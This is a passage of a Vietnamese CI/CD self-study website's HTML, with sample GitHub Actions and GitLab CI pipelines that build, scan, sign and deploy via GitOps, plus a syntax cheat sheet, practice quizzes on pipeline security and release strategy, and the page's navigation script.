+<ul><li><b>Đọc log từ trên xuống</b>, tìm dòng lỗi đầu tiên: lỗi sau thường chỉ là hệ quả.</li><li>Bật log chi tiết có kiểm soát (<code>ACTIONS_STEP_DEBUG</code> của Actions, <code>CI_DEBUG_TRACE</code> của GitLab: cẩn thận vì có thể in cả bí mật).</li><li>Tái hiện cục bộ: chạy đúng lệnh trong cùng image (<code>docker run -it --rm -v "$PWD":/w -w /w IMAGE bash</code>), hoặc dùng <code>act</code> cho GitHub Actions.</li><li>Với lỗi chỉ xảy ra trên runner: cho phép truy cập tạm thời có kiểm soát (một số nền tảng có phiên SSH debug), tránh để lại cho runner dùng chung.</li><li>Thu thập artifact khi lỗi (<code>if: always()</code>/<code>when: always</code>): báo cáo test, log, ảnh chụp.</li></ul>
+<h2>Thói quen bền vững</h2>
+<ul><li>Đặt <b><code>timeout-minutes</code></b> cho mọi job.</li><li>Đặt <b>ngân sách thời gian</b> cho pipeline (ví dụ phản hồi đầu tiên dưới 10 phút) và theo dõi theo thời gian: pipeline chậm dần là nợ.</li><li>Giữ pipeline <b>như mã</b>: review thay đổi, kiểm tra cú pháp (<code>actionlint</code>), cập nhật phụ thuộc có kiểm soát.</li><li>Theo dõi <b>tỷ lệ pipeline xanh</b> của nhánh chính, và mức flaky.</li></ul>
+<div class="callout lab"><b>Tìm bước chậm nhất và thử một tối ưu</b><p>Lấy một workflow bạn có (hoặc workflow ở trang <a href="#gha">GitHub Actions</a>).</p>
+<ol><li>Mở một lần chạy gần đây, ghi thời gian từng bước. Bước nào chiếm nhiều nhất?</li><li>Thêm cache phụ thuộc và so thời gian lần chạy thứ hai với lần đầu.</li><li>Thêm bộ lọc <code>paths:</code> rồi đẩy một commit chỉ đổi tệp tài liệu: pipeline có được bỏ qua không?</li><li>Thêm <code>timeout-minutes: 10</code> vào job và <code>concurrency</code> huỷ lần chạy cũ.</li></ol>
+<p>Ghi lại thời gian trước và sau mỗi thay đổi.</p></div>
+</article>
+<article class="page" data-id="reference-pipelines" data-group="Tham chiếu" data-title="Pipeline mẫu hoàn chỉnh" hidden>
+<h1>Pipeline mẫu hoàn chỉnh</h1>
+<p class="lead">Một pipeline từ commit tới triển khai, ghép các mảnh ở những trang trước: kiểm thử, build một lần, quét, ký, cập nhật repo GitOps. Chỉ là điểm khởi đầu: điều chỉnh theo dự án.</p>
+<div class="callout warn"><b>Ví dụ chỉ để minh hoạ</b><p>Phiên bản action, tên tổ chức, ARN và đường dẫn là giả định. Hãy ghim action theo mã băm commit, thay bằng giá trị thật, kiểm tra bằng <code>actionlint</code>, và thử trên repo thử nghiệm trước khi dùng.</p></div>
+<h2>Kiến trúc của pipeline</h2>
+<pre class="ascii"><code>  PR:   lint -&gt; test -&gt; build (không đẩy) -&gt; quét      (không triển khai)
+
+  main: lint -&gt; test -&gt; build+đẩy image (tag SHA) -&gt; quét -&gt; ký
+                                                              |
+                                              cập nhật tag trong repo cấu hình (GitOps)
+                                                              |
+                                           Flux/Argo CD đồng bộ dev  -&gt; (kiểm tra) -&gt; PR lên staging -&gt; PR lên prod (duyệt)</code></pre>
+<h2>Workflow GitHub Actions</h2>
+<pre><code>name: ci-cd
+on:
+  pull_request:
+  push:
+    branches: [main]
+
+permissions:
+  contents: read
+
+concurrency:
+  group: ci-${{ github.ref }}
+  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
+
+env:
+  REGISTRY: ghcr.io
+  IMAGE: ghcr.io/myorg/web
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with: {python-version: "3.12", cache: pip}
+      - run: pip install -r requirements.txt
+      - run: pytest -q
+
+  image:
+    needs: test
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    permissions:
+      contents: read
+      packages: write          # đẩy image lên GHCR
+      id-token: write          # ký keyless bằng OIDC
+    outputs:
+      digest: ${{ steps.push.outputs.digest }}
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/setup-buildx-action@v3
+      - uses: docker/login-action@v3
+        if: github.event_name == 'push'
+        with:
+          registry: ${{ env.REGISTRY }}
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+      - id: push
+        uses: docker/build-push-action@v6
+        with:
+          context: .
+          push: ${{ github.event_name == 'push' }}
+          tags: ${{ env.IMAGE }}:${{ github.sha }}
+          cache-from: type=gha
+          cache-to: type=gha,mode=max
+      - name: Quét lỗ hổng
+        uses: aquasecurity/trivy-action@0.28.0   # ví dụ: nên ghim theo mã băm commit
+        with:
+          image-ref: ${{ env.IMAGE }}:${{ github.sha }}
+          severity: HIGH,CRITICAL
+          exit-code: "1"
+          ignore-unfixed: true
+        if: github.event_name == 'push'
+      - uses: sigstore/cosign-installer@v3
+        if: github.event_name == 'push'
+      - name: Ký image
+        if: github.event_name == 'push'
+        run: cosign sign --yes "${IMAGE}@${DIGEST}"
+        env:
+          IMAGE: ${{ env.IMAGE }}
+          DIGEST: ${{ steps.push.outputs.digest }}
+
+  update-gitops:
+    if: github.event_name == 'push'
+    needs: image
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          repository: myorg/deploy-config
+          token: ${{ secrets.DEPLOY_CONFIG_TOKEN }}    # token chỉ có quyền ghi vào repo cấu hình
+      - name: Cập nhật tag dev
+        run: |
+          cd envs/dev
+          kustomize edit set image web="${IMAGE}@${DIGEST}"
+          git config user.name "ci-bot" &amp;&amp; git config user.email "ci-bot@example.com"
+          git commit -am "dev: web -&gt; ${GITHUB_SHA::7}" &amp;&amp; git push
+        env:
+          IMAGE: ghcr.io/myorg/web
+          DIGEST: ${{ needs.image.outputs.digest }}</code></pre>
+<p>Điểm đáng chú ý:</p>
+<ul><li>Mọi đầu vào do người dùng kiểm soát (không có ở đây) đi qua biến môi trường; <code>GITHUB_SHA</code> và digest là giá trị an toàn do hệ thống tạo.</li><li><code>packages: write</code> và <code>id-token: write</code> chỉ mở cho job <code>image</code>, không cho cả workflow.</li><li>Artifact được định danh bằng <b>digest</b> khi cập nhật repo cấu hình: triển khai đúng cái đã quét và đã ký.</li><li>Pull request chỉ build, không đẩy, không ký, không đụng repo cấu hình.</li><li>Token cập nhật repo cấu hình (<code>DEPLOY_CONFIG_TOKEN</code>) chỉ có quyền hẹp (một repo); tốt hơn nữa là dùng GitHub App hoặc danh tính ngắn hạn.</li></ul>
+<h2>Bản tương đương trên GitLab CI</h2>
+<pre><code>stages: [test, build, scan, deploy]
+
+variables:
+  IMAGE: $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
+
+test:
+  stage: test
+  image: python:3.12-slim
+  script:
+    - pip install -r requirements.txt
+    - pytest -q
+
+build:
+  stage: build
+  image:
+    name: gcr.io/kaniko-project/executor:debug
+    entrypoint: [""]
+  script:
+    - /kaniko/executor --context "$CI_PROJECT_DIR" --dockerfile Dockerfile --destination "$IMAGE"
+  rules:
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+
+scan:
+  stage: scan
+  image:
+    name: aquasec/trivy:latest
+    entrypoint: [""]
+  script:
+    - trivy image --severity HIGH,CRITICAL --exit-code 1 --ignore-unfixed "$IMAGE"
+  rules:
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+
+deploy-dev:
+  stage: deploy
+  script:
+    - ./scripts/update-gitops.sh dev "$CI_COMMIT_SHA"
+  environment: dev
+  rules:
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH</code></pre>
+<p>Dùng Kaniko (build không cần daemon, không cần chế độ privileged) thay cho Docker-in-Docker là lựa chọn an toàn hơn trên runner dùng chung. Với image công cụ (<code>trivy:latest</code>, <code>kaniko:debug</code>) ở môi trường thật hãy ghim phiên bản.</p>
+<h2>Điều chỉnh cho dự án của bạn</h2>
+<div class="tw"><table><tr><th>Nếu</th><th>Thay đổi</th></tr><tr><td>Không dùng Kubernetes/GitOps</td><td>Thay bước <code>update-gitops</code> bằng bước triển khai (ssh, <code>helm upgrade</code>, <code>aws ecs update-service</code>) chạy với danh tính OIDC</td></tr><tr><td>Cần duyệt trước production</td><td>Thêm job <code>environment: production</code> có người duyệt bắt buộc, hoặc PR cần review ở repo cấu hình</td></tr><tr><td>Có nhiều dịch vụ</td><td>Dùng workflow tái sử dụng (<a href="#gha">GitHub Actions</a>) và bộ lọc đường dẫn</td></tr><tr><td>Cần phát hành theo phiên bản</td><td>Thêm job theo tag <code>v*</code> dùng <code>release-please</code>/<code>semantic-release</code> (<a href="#artifacts">Artifact</a>)</td></tr><tr><td>Cần canary</td><td>Thay Deployment bằng Rollout (<a href="#progressive-delivery">Progressive delivery</a>)</td></tr></table></div>
+<div class="callout lab"><b>Kiểm tra workflow trước khi đẩy</b><pre><code>mkdir -p .github/workflows &amp;&amp; cat &gt; .github/workflows/ci-cd.yml   # dán workflow ở trên vào
+actionlint                          # kiểm tra cú pháp và biểu thức
+yamllint -d relaxed .github/workflows/ci-cd.yml
+grep -n "uses:" .github/workflows/ci-cd.yml        # còn action nào chưa ghim?
+act pull_request -j test             # chạy thử job test cục bộ (cần Docker và act)</code></pre>
+<p>Liệt kê những chỗ bạn sẽ đổi để dùng cho dự án thật, và những action cần ghim theo mã băm.</p></div>
+</article>
+<article class="page" data-id="cicd-cheatsheet" data-group="Tham chiếu" data-title="Cheat sheet CI/CD" hidden>
+<h1>Cheat sheet CI/CD</h1>
+<p class="lead">Tra nhanh theo nhu cầu: cú pháp hay dùng, quy ước phiên bản, chiến lược phát hành, và những điều nên kiểm tra.</p>
+<h2>GitHub Actions: cú pháp hay dùng</h2>
+<div class="tw"><table><tr><th>Cần</th><th>Viết</th></tr><tr><td>Kích hoạt</td><td><code>on: [push, pull_request]</code>, <code>workflow_dispatch</code>, <code>schedule: [{cron: "0 2 * * *"}]</code></td></tr><tr><td>Giới hạn nhánh, đường dẫn</td><td><code>on: push: {branches: [main], paths: ["src/**"]}</code></td></tr><tr><td>Quyền tối thiểu</td><td><code>permissions: {contents: read}</code></td></tr><tr><td>Thứ tự job</td><td><code>needs: [build]</code></td></tr><tr><td>Điều kiện</td><td><code>if: github.ref == 'refs/heads/main'</code></td></tr><tr><td>Ma trận</td><td><code>strategy: {matrix: {python: ["3.11", "3.12"]}, fail-fast: false}</code></td></tr><tr><td>Đầu ra của bước, của job</td><td><code>echo "k=v" &gt;&gt; "$GITHUB_OUTPUT"</code>, <code>outputs: {k: ${{ steps.id.outputs.k }}}</code></td></tr><tr><td>Môi trường (có duyệt)</td><td><code>environment: production</code></td></tr><tr><td>Chặn chạy chồng</td><td><code>concurrency: {group: deploy-prod, cancel-in-progress: false}</code></td></tr><tr><td>Giới hạn thời gian</td><td><code>timeout-minutes: 15</code></td></tr><tr><td>Luôn chạy (dọn dẹp, thu log)</td><td><code>if: always()</code></td></tr><tr><td>OIDC</td><td><code>permissions: {id-token: write}</code> rồi action đăng nhập cloud</td></tr><tr><td>Dùng lại workflow</td><td><code>uses: org/repo/.github/workflows/x.yml@v1</code> kèm <code>workflow_call</code></td></tr></table></div>
+<h2>GitLab CI: từ khoá hay dùng</h2>
+<div class="tw"><table><tr><th>Cần</th><th>Viết</th></tr><tr><td>Thứ tự</td><td><code>stages: [...]</code>, <code>needs: [job]</code></td></tr><tr><td>Điều kiện</td><td><code>rules: [{if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH}]</code>, <code>rules: [{changes: ["src/**"]}]</code></td></tr><tr><td>Duyệt tay</td><td><code>when: manual</code></td></tr><tr><td>Môi trường</td><td><code>environment: {name: production, url: ...}</code></td></tr><tr><td>Chặn chồng nhau</td><td><code>resource_group: production</code></td></tr><tr><td>Cache, artifact</td><td><code>cache: {key: {files: [lock]}, paths: [...]}</code>, <code>artifacts: {paths: [...], when: always}</code></td></tr><tr><td>Tái sử dụng</td><td><code>extends:</code>, <code>include:</code>, <code>!reference [...]</code></td></tr><tr><td>Giới hạn thời gian</td><td><code>timeout: 15m</code></td></tr></table></div>
+<h2>Quy ước phiên bản và commit</h2>
+<div class="tw"><table><tr><th>Cần</th><th>Ghi nhớ</th></tr><tr><td>Semver</td><td><code>MAJOR.MINOR.PATCH</code>: phá vỡ, tính năng, sửa lỗi</td></tr><tr><td>Conventional Commits</td><td><code>feat:</code> (MINOR), <code>fix:</code> (PATCH), <code>feat!:</code> hoặc <code>BREAKING CHANGE:</code> (MAJOR)</td></tr><tr><td>Tag Git phát hành</td><td><code>git tag -a v1.4.2 -m "..." &amp;&amp; git push origin v1.4.2</code></td></tr><tr><td>Tag artifact</td><td>SHA cho mọi build, semver cho phát hành, <b>digest</b> khi triển khai</td></tr><tr><td>Không dùng để triển khai</td><td><code>latest</code>, tag di động (<code>main</code>, <code>1.4</code>)</td></tr></table></div>
+<h2>Chiến lược phát hành</h2>
+<div class="tw"><table><tr><th>Chiến lược</th><th>Dùng khi</th><th>Quay lui</th></tr><tr><td>Recreate</td><td>Chấp nhận khoảng chết</td><td>Triển khai lại</td></tr><tr><td>Rolling</td><td>Mặc định cho dịch vụ web</td><td>Rollout ngược</td></tr><tr><td>Blue-green</td><td>Cần quay lui tức thì, có ngân sách</td><td>Đổi lại đích traffic</td></tr><tr><td>Canary</td><td>Thay đổi rủi ro, có chỉ số tốt</td><td>Rút traffic</td></tr><tr><td>Shadow</td><td>Thử với traffic thật không ảnh hưởng người dùng</td><td>Không cần</td></tr><tr><td>Cờ tính năng</td><td>Tách triển khai khỏi phát hành</td><td>Tắt cờ</td></tr></table></div>
+<h2>Thay đổi database</h2>
+<p>Mở rộng (thêm, tương thích) rồi triển khai, backfill, chuyển đọc/ghi, và <b>cuối cùng mới xoá</b> (contract). Không đổi tên hoặc xoá cột trong cùng lần phát hành với mã dùng nó. Ưu tiên tiến lên hơn quay lui schema.</p>
+<h2>Danh sách kiểm tra nhanh cho một pipeline</h2>
+<div class="tw"><table><tr><th>Việc</th><th>Kiểm tra</th></tr><tr><td>Phản hồi nhanh</td><td>Lint và test nhanh chạy đầu, có cache, có song song</td></tr><tr><td>Build một lần</td><td>Cùng artifact đi qua mọi môi trường, định danh bằng digest</td></tr><tr><td>Bảo mật</td><td>Quét bí mật, phụ thuộc, image, IaC; action ghim theo mã băm; quyền tối thiểu</td></tr><tr><td>Xác thực</td><td>OIDC, không khoá dài hạn trong biến CI</td></tr><tr><td>Production</td><td>Chỉ từ nhánh chính hoặc tag; có duyệt; có khoá chống chồng nhau</td></tr><tr><td>Quay lui</td><td>Có đường quay lui đã thử; artifact cũ còn giữ</td></tr><tr><td>Quan sát</td><td>Dấu mốc triển khai; smoke test; cảnh báo; đo DORA</td></tr></table></div>
+</article>
+<article class="page" data-id="quiz-ci" data-group="Luyện tập" data-title="Luyện tập 1: CI, pipeline và bảo mật" hidden>
+<h1>Luyện tập 1: CI, pipeline và bảo mật</h1>
+<p class="lead">6 câu tình huống về nguyên tắc CI/CD, thiết kế pipeline, artifact và bảo mật. Chọn đáp án rồi bấm "Kiểm tra" để xem giải thích. Kết quả được lưu trong trình duyệt.</p>
+<h2>Câu hỏi</h2>
+<div class="quiz"></div>
+<script type="application/json" class="qj">[{"q": "Nhóm bạn merge vào nhánh chính mỗi vài ngày từ các nhánh tính năng sống lâu, và thường xuyên gặp xung đột lớn, test đỏ sau khi merge. Điều chỉnh nào phù hợp nhất với tinh thần CI?", "o": ["Tăng thời gian review lên gấp đôi", "Đóng băng nhánh chính trong tuần trước phát hành", "Tích hợp thường xuyên bằng thay đổi nhỏ và nhánh ngắn (trunk-based), ẩn việc chưa xong sau cờ tính năng, và giữ nhánh chính luôn xanh", "Thêm nhiều môi trường staging hơn"], "a": [2], "e": "CI là tích hợp thường xuyên để lỗi tích hợp lộ ra sớm khi còn nhỏ. Nhánh sống lâu chỉ trì hoãn tích hợp. Cờ tính năng cho phép merge mã chưa hoàn thiện mà không bật cho người dùng."}, {"q": "Pipeline của bạn build lại image riêng cho từng môi trường (dev, staging, production) từ cùng một commit. Vấn đề chính của cách này là gì?", "o": ["Tốn dung lượng registry và không có vấn đề nào khác", "Không thể gắn tag cho nhiều image", "Image được kiểm thử ở staging không còn là image chạy ở production (build lại có thể khác do phụ thuộc đổi, thời gian); nên build một lần rồi đưa chính artifact đó qua các môi trường, khác biệt nằm ở cấu hình", "Image luôn chạy chậm hơn khi build nhiều lần"], "a": [2], "e": "Điều bạn kiểm thử phải là điều bạn triển khai. Build một lần, định danh bằng SHA hoặc digest, rồi promotion bằng cách chỉ định artifact cho môi trường tiếp theo. Cấu hình riêng từng môi trường nằm ngoài artifact."}, {"q": "Chọn TẤT CẢ biện pháp làm giảm rủi ro cho workflow GitHub Actions.", "o": ["Ghim action bên thứ ba theo mã băm commit đầy đủ thay vì tag di động", "Truyền dữ liệu như tiêu đề PR qua biến môi trường thay vì chèn trực tiếp `${{ ... }}` vào lệnh `run:`", "Đặt `permissions` tối thiểu cho token và chỉ mở thêm ở job cần", "Cho workflow `pull_request_target` checkout và chạy mã của PR từ fork để kiểm thử nhanh"], "a": [0, 1, 2], "e": "`pull_request_target` chạy với bí mật và quyền ghi của repo gốc, nên chạy mã từ fork trong đó là nguy hiểm. Ba biện pháp còn lại giảm bề mặt tấn công: quyền tối thiểu, chuỗi cung ứng action, và chống chèn script."}, {"q": "Pipeline production dùng khoá truy cập AWS dài hạn lưu trong secret của CI. Cải thiện hợp lý nhất?", "o": ["Cho cả tổ chức dùng chung khoá để dễ quản lý", "Mã hoá khoá bằng base64 trong file cấu hình", "Dùng OIDC để job nhận thông tin xác thực ngắn hạn cho đúng repo và nhánh/môi trường, với vai trò quyền tối thiểu và điều kiện `sub` chặt trong trust policy", "Đổi tên secret thành tên khó đoán hơn"], "a": [2], "e": "Khoá dài hạn là mục tiêu bị đánh cắp và hiếm khi được xoay vòng. OIDC cấp quyền tạm thời theo danh tính của job, và điều kiện `sub` giới hạn đúng repo/nhánh được phép. Base64 không phải mã hoá."}, {"q": "Bộ test của bạn có vài test hay đỏ ngẫu nhiên, và mọi người quen bấm \"chạy lại\" cho tới khi xanh. Hệ quả nguy hiểm nhất và cách đúng?", "o": ["Mọi người mất niềm tin vào pipeline và bỏ qua cả lỗi thật; cần đo, cách ly (quarantine) test flaky khỏi đường chặn, có người chịu trách nhiệm sửa nguyên nhân gốc thay vì chỉ thêm retry", "Không sao, miễn cuối cùng pipeline xanh", "Xoá hết các test chậm", "Chuyển toàn bộ sang kiểm thử thủ công"], "a": [0], "e": "Test không ổn định làm tín hiệu của pipeline mất giá trị. Cách ly giúp giữ đường chặn đáng tin cậy trong lúc sửa; retry chỉ nên là biện pháp tạm có ghi nhận, không phải lời giải."}, {"q": "Bạn muốn đặt phiên bản tự động và changelog dựa trên lịch sử commit. Điều kiện và cách thực hiện phù hợp?", "o": ["Mỗi người tự đặt số phiên bản trong tên tệp", "Dùng Conventional Commits (`feat:`, `fix:`, `feat!:`) và công cụ như semantic-release hoặc release-please để tự tính semver, tạo tag và changelog; kiểm tra định dạng commit trong CI", "Đặt phiên bản bằng ngày hiện tại và bỏ qua semver", "Dùng tag `latest` cho mọi bản phát hành"], "a": [1], "e": "Quy ước commit có cấu trúc cho phép công cụ suy ra mức tăng phiên bản (MAJOR cho thay đổi phá vỡ, MINOR cho tính năng, PATCH cho sửa lỗi). Cần cả nhóm tuân theo, và nên có kiểm tra tự động."}]</script>
+</article>
+<article class="page" data-id="quiz-cd" data-group="Luyện tập" data-title="Luyện tập 2: Phát hành, GitOps và khôi phục" hidden>
+<h1>Luyện tập 2: Phát hành, GitOps và khôi phục</h1>
+<p class="lead">6 câu tình huống về chiến lược phát hành, GitOps, migration database và rollback.</p>
+<h2>Câu hỏi</h2>
+<div class="quiz"></div>
+<script type="application/json" class="qj">[{"q": "Bạn cập nhật dịch vụ bằng rolling update, nhưng migration đã đổi tên cột `name` thành `full_name` và xoá cột cũ ngay trong cùng lần phát hành. Chuyện gì xảy ra và cách đúng là gì?", "o": ["Chuyển sang chiến lược recreate để tránh vấn đề", "Không có vấn đề vì rolling update thay từng Pod", "Trong lúc cuốn chiếu, Pod bản cũ vẫn đọc cột `name` đã bị xoá và lỗi; dùng expand/contract: thêm cột mới, ghi cả hai, backfill, chuyển đọc, và chỉ xoá cột cũ ở lần phát hành sau", "Chỉ cần tăng số replica"], "a": [2], "e": "Khi rolling hoặc canary, bản cũ và mới chạy cùng lúc trên cùng database, nên schema phải tương thích cả hai. Chia thay đổi phá vỡ thành các bước nhỏ tương thích ngược, mỗi bước triển khai riêng; recreate chỉ che vấn đề bằng khoảng chết."}, {"q": "Bạn cần phát hành thay đổi rủi ro cho một API có lưu lượng lớn và đã có chỉ số tỷ lệ lỗi, độ trễ tốt. Chiến lược nào cân bằng rủi ro và chi phí nhất?", "o": ["Triển khai thẳng cho 100% rồi chờ người dùng báo lỗi", "Recreate vào ban đêm", "Blue-green nhưng không kiểm tra chỉ số", "Canary: cho một phần nhỏ traffic vào bản mới, đo chỉ số rồi tăng dần hoặc tự động rút lại khi xấu đi"], "a": [3], "e": "Canary giới hạn số người chịu rủi ro và tận dụng chỉ số có sẵn để ra quyết định (có thể tự động hoá bằng Argo Rollouts hoặc Flagger). Blue-green chuyển toàn bộ một lần nên mọi người cùng chịu nếu có lỗi; recreate gây gián đoạn."}, {"q": "Chọn TẤT CẢ ưu điểm của GitOps kiểu kéo (Flux, Argo CD) so với việc pipeline CI chạy `kubectl apply` vào cụm.", "o": ["Quay lui bằng `git revert`, và lịch sử Git ghi lại ai đổi gì, khi nào", "CI không cần giữ thông tin xác thực vào cụm production, giảm bề mặt tấn công", "Không còn cần repo Git hay review thay đổi", "Bộ điều khiển trong cụm liên tục đối chiếu và phát hiện hoặc sửa drift"], "a": [0, 1, 3], "e": "GitOps lấy Git làm nguồn sự thật nên vẫn cần review và lịch sử Git (đó là ưu điểm, không phải thứ bị bỏ). Việc kéo từ trong cụm tránh phải đưa khoá vào CI, và việc đối chiếu liên tục giúp phát hiện thay đổi tay."}, {"q": "Sau một lần triển khai, tỷ lệ lỗi tăng vọt. Cụm dùng Argo CD đồng bộ từ Git. Cách quay lui đúng nhất là gì?", "o": ["Tắt giám sát để giảm cảnh báo", "`git revert` commit triển khai trong repo cấu hình để Argo CD đưa cụm về trạng thái trước (hoặc rút canary/tắt cờ tính năng nếu có sẵn), vì nếu sửa tay ngoài Git, bộ điều khiển sẽ ghi đè lại", "Chạy `kubectl rollout undo` trực tiếp rồi để yên", "Xoá Deployment rồi chờ Argo CD tạo lại"], "a": [1], "e": "Trong GitOps, Git là trạng thái mong muốn: chỉnh tay trong cụm sẽ bị bộ điều khiển đưa trở lại. Quay lui đúng là đổi trong Git. Cờ tính năng hoặc rút canary còn nhanh hơn nếu đã được thiết lập, vì giảm thiệt hại trong vài giây."}, {"q": "Dịch vụ có 200 request mỗi phút. Bạn đặt canary 5% trong 5 phút với cổng \"tỷ lệ lỗi dưới 1%\". Vì sao cổng này có thể vô nghĩa, và nên chỉnh thế nào?", "o": ["Vì tỷ lệ lỗi không bao giờ đo được trong canary", "Canary chỉ nhận khoảng 50 request trong 5 phút, một lỗi đơn lẻ đã là 2% và nhiễu thống kê rất lớn; cần thời gian dài hơn, tỷ lệ cao hơn, hoặc ngưỡng theo số lượng lỗi hoặc chỉ số khác phù hợp với lưu lượng", "Vì canary không dùng được với dịch vụ web", "Vì 5% luôn quá nhỏ cho mọi dịch vụ"], "a": [1], "e": "Ý nghĩa thống kê phụ thuộc số mẫu. Với ít request, cổng theo phần trăm dao động mạnh nên gây rollback giả hoặc bỏ lọt lỗi. Thiết kế cổng theo lưu lượng thật: kéo dài thời gian, tăng tỷ lệ, hoặc dùng ngưỡng theo số lượng."}, {"q": "Một đồng nghiệp đề xuất lấy \"số lần triển khai mỗi tuần\" làm mục tiêu để đánh giá từng lập trình viên. Rủi ro chính?", "o": ["Chỉ số bị biến thành mục tiêu sẽ bị làm sai lệch: người ta tách thay đổi vô nghĩa để tăng con số hoặc né ghi nhận sự cố; nên dùng DORA để thấy nút thắt và so với chính mình theo thời gian, đo cả tốc độ lẫn độ ổn định", "Tần suất triển khai không liên quan tới hiệu quả phát hành", "Chỉ cần đo thêm số dòng mã là đủ", "Không có rủi ro vì tần suất triển khai là chỉ số khách quan"], "a": [0], "e": "Đây là định luật Goodhart. DORA hữu ích để chẩn đoán quy trình của cả nhóm, nhưng dùng để chấm điểm cá nhân sẽ khuyến khích tối ưu con số thay vì kết quả. Bốn chỉ số cần xem cùng nhau."}]</script>
+</article>
+
+    <footer>
+      <p style="margin:0 0 8px"><a href="https://tracviethustcs.github.io/">← Về trang chủ Trác Việt</a></p>
+      <p style="margin:0 0 8px"><b style="color:var(--ink)">Soạn bởi Trác Việt</b> (<a href="https://github.com/TracVietHustCS" target="_blank" rel="noopener">@TracVietHustCS</a>)</p>
+      Ghi chú tự học, tự soạn, không phải tài liệu chính thức của GitHub, GitLab, Jenkins hay bất kỳ nhà cung cấp nào. Cú pháp workflow, tên action, phiên bản công cụ và tính năng thay đổi theo thời gian: hãy đối chiếu tài liệu hiện hành và thử trên repo thử nghiệm trước khi áp dụng vào pipeline thật. Đừng cấp quyền triển khai production cho pipeline mà bạn chưa kiểm soát được.
+    </footer>
+  </main>
+
+  <nav id="toc" aria-label="Trong trang này"></nav>
+</div>
+
+<script>
+const $=(s,r=document)=>r.querySelector(s), $$=(s,r=document)=>[...r.querySelectorAll(s)];
+const pages=$$('.page');
+const index=pages.map(p=>p.textContent.toLowerCase());
+let read={};
+try{read=JSON.parse(localStorage.getItem('cicd-read')||'{}')}catch(e){}
+const saveRead=()=>{try{localStorage.setItem('cicd-read',JSON.stringify(read))}catch(e){}};
+
+/* sidebar */
+const groups=[];
+pages.forEach(p=>{
+  let g=groups.find(x=>x.name===p.dataset.group);
+  if(!g){g={name:p.dataset.group,items:[]};groups.push(g)}
+  g.items.push(p);
+});
+let current='overview';
+function buildNav(){
+  $('#side-links').innerHTML=groups.map(g=>`<div class="grp"><h3>${g.name}</h3>${g.items.map(p=>
+    `<a href="#${p.dataset.id}" data-id="${p.dataset.id}" class="${read[p.dataset.id]?'read':''}">${p.dataset.title}</a>`).join('')}</div>`).join('');
+  const n=Object.values(read).filter(Boolean).length;
+  $('#progtxt').textContent=`Đã đọc ${n}/${pages.length} trang`;
+  $('#progbar').style.width=(n/pages.length*100)+'%';
+  $$('#side-links a').forEach(a=>a.classList.toggle('on',a.dataset.id===current));
+  applyFilter();
+}
+
+/* pages */
+function show(id){
+  const page=pages.find(p=>p.dataset.id===id)||pages[0];
+  current=page.dataset.id;
+  pages.forEach(p=>p.hidden=(p!==page));
+  if(!$('.crumb',page)){
+    const c=document.createElement('div');c.className='crumb';
+    c.textContent=page.dataset.group+'  ›  '+page.dataset.title;
+    page.prepend(c);
+  }
+  $$('pre',page).forEach(pre=>{
+    if($('.copy',pre)||pre.classList.contains('ascii'))return;
+    const b=document.createElement('button');b.className='copy';b.type='button';b.textContent='Sao chép';
+    b.addEventListener('click',()=>copyCode(pre,b));
+    pre.appendChild(b);
+  });
+  $$('.mark,.pn',page).forEach(e=>e.remove());
+  const m=document.createElement('div');m.className='mark';
+  m.innerHTML=`<button type="button" aria-pressed="${!!read[current]}">${read[current]?'Đã đọc ✓':'Đánh dấu đã đọc'}</button>`;
+  m.firstChild.addEventListener('click',e=>{
+    read[current]=!read[current];saveRead();
+    e.currentTarget.setAttribute('aria-pressed',!!read[current]);
+    e.currentTarget.textContent=read[current]?'Đã đọc ✓':'Đánh dấu đã đọc';
+    buildNav();
+  });
+  page.appendChild(m);
+  const i=pages.indexOf(page),prev=pages[i-1],next=pages[i+1];
+  const pn=document.createElement('div');pn.className='pn';
+  pn.innerHTML=(prev?`<a href="#${prev.dataset.id}"><small>Trước</small>${prev.dataset.title}</a>`:'<span></span>')+
+               (next?`<a href="#${next.dataset.id}"><small>Tiếp theo</small>${next.dataset.title}</a>`:'');
+  page.appendChild(pn);
+
+  document.title=page.dataset.title+' · CI/CD notes';
+  buildNav();initQuiz(page);buildToc(page);
+  window.scrollTo(0,0);
+  closeSide();
+}
+function copyCode(pre,btn){
+  const text=$('code',pre).innerText;
+  const done=()=>{btn.textContent='Đã chép';setTimeout(()=>btn.textContent='Sao chép',1400)};
+  const fallback=()=>{
+    try{const r=document.createRange();r.selectNodeContents($('code',pre));
+      const s=getSelection();s.removeAllRanges();s.addRange(r);document.execCommand('copy');s.removeAllRanges();done();}
+    catch(e){btn.textContent='Không chép được'}
+  };
+  try{navigator.clipboard.writeText(text).then(done,fallback)}catch(e){fallback()}
+}
+
+/* on this page */
+let tocItems=[];
+function buildToc(page){
+  const hs=$$('h2,h3',page);
+  tocItems=hs.map((h,i)=>{h.id=`${current}-h${i}`;return {h,a:null}});
+  $('#toc').innerHTML='<h4>Trong trang này</h4>'+hs.map((h,i)=>`<a href="#" class="${h.tagName==='H3'?'l3':''}" data-i="${i}">${h.textContent}</a>`).join('');
+  $$('#toc a').forEach(a=>{
+    tocItems[+a.dataset.i].a=a;
+    a.addEventListener('click',e=>{e.preventDefault();tocItems[+a.dataset.i].h.scrollIntoView({behavior:matchMedia('(prefers-reduced-motion:reduce)').matches?'auto':'smooth'})});
+  });
+  spy();
+}
+function spy(){
+  if(!tocItems.length)return;
+  let cur=0;
+  tocItems.forEach((t,i)=>{if(t.h.getBoundingClientRect().top<110)cur=i});
+  tocItems.forEach((t,i)=>t.a&&t.a.classList.toggle('on',i===cur));
+}
+addEventListener('scroll',spy,{passive:true});
+
+/* search */
+function applyFilter(){
+  const q=$('#q').value.trim().toLowerCase();
+  let any=false;
+  $$('.grp').forEach(g=>{
+    let vis=false;
+    $$('a',g).forEach(a=>{
